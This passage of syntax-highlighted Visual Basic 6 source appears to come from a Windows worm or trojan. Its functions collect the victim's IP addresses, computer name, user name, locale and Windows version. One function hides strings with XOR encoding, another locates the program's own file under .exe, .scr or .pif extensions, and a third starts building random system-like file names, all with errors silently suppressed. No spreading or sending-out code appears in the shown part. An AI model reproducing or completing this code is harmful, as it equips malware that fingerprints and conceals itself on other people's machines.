</span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">hostip_addr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Host.h_addr_list</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc7">ip_address</span><span class="sc6">(</span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0">
</span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc7">temp_ip_address</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Host.h_length</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">temp_ip_address</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">hostip_addr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Host.h_length</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Host.h_length</span><span class="sc0">
</span><span class="sc7">ip_address</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ip_address</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">temp_ip_address</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">ip_address</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid$</span><span class="sc6">(</span><span class="sc7">ip_address</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">Host.h_addr_list</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Host.h_addr_list</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">LenB</span><span class="sc6">(</span><span class="sc7">Host.h_addr_list</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">hostip_addr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Host.h_addr_list</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">hostip_addr</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc3">Preserve</span><span class="sc0"> </span><span class="sc7">ip_address</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">GetLclIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ip_address</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EndWinsock</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetComputerNameEx</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lBufSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lStatus</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">lBufSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sBuffer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">String$</span><span class="sc6">(</span><span class="sc7">lBufSize</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">lStatus</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetComputerName</span><span class="sc6">(</span><span class="sc7">sBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lBufSize</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">lStatus</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">GetComputerNameEx</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">sBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lBufSize</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetUser</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lpUserID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">lpUserID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">(</span><span class="sc2">25</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">nBuffer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetUserName</span><span class="sc6">(</span><span class="sc7">lpUserID</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nBuffer</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">GetUser</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">lpUserID</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nBuffer</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">PaisID</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">LCID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetSystemDefaultLangID</span><span class="sc6">():</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">GetLocaleInfo</span><span class="sc6">(</span><span class="sc7">LCID</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">&amp;H6</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">sBuf</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">PaisID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Trim$</span><span class="sc6">(</span><span class="sc7">sBuf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">LangID</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">LCID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetSystemDefaultLangID</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetLocaleInfo</span><span class="sc6">(</span><span class="sc7">LCID</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">&amp;H4</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">sBuf</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">LangID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">sBuf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">gShP</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">shp</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">shp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetShortPathName</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">shp</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">shp</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">gShP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">shp</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWinVersion</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">OSinfo</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">OSVERSIONINFO</span><span class="sc0">
    </span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">OSinfo</span><span class="sc0">
        </span><span class="sc6">.</span><span class="sc7">dwOSVersionInfoSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">148</span><span class="sc0">
        </span><span class="sc6">.</span><span class="sc7">szCSDVersion</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">128</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">GetVersionExA</span><span class="sc6">(</span><span class="sc7">OSinfo</span><span class="sc6">)</span><span class="sc0">
     </span><span class="sc7">GetWinVersion</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">.</span><span class="sc7">dwPlatformId</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">q</span><span class="sc6">(</span><span class="sc7">j</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">R</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">j</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">q</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">q</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">j</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">R</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc3">Xor</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Flx</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Flx</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc7">Flx</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IIf</span><span class="sc6">(</span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbArchive</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbHidden</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbNormal</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbReadOnly</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbSystem</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Fdx</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Fdx</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">Fdx</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IIf</span><span class="sc6">(</span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbDirectory</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbNormal</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbReadOnly</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbSystem</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0">

</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowsDirectory</span><span class="sc6">(</span><span class="sc7">spath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">spath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetSystemDirectory</span><span class="sc6">(</span><span class="sc7">spath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">spath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetTempPath</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">spath</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">spath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">spath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">Ex</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">".exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".scr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".pif"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".bat"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Ex</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Flx</span><span class="sc6">(</span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ex</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Sp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ex</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RndName</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">RI</span><span class="sc6">(</span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">

</span><span class="sc7">pre</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"win"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"acc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"asd"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"un"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"char"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ctv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"reg"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
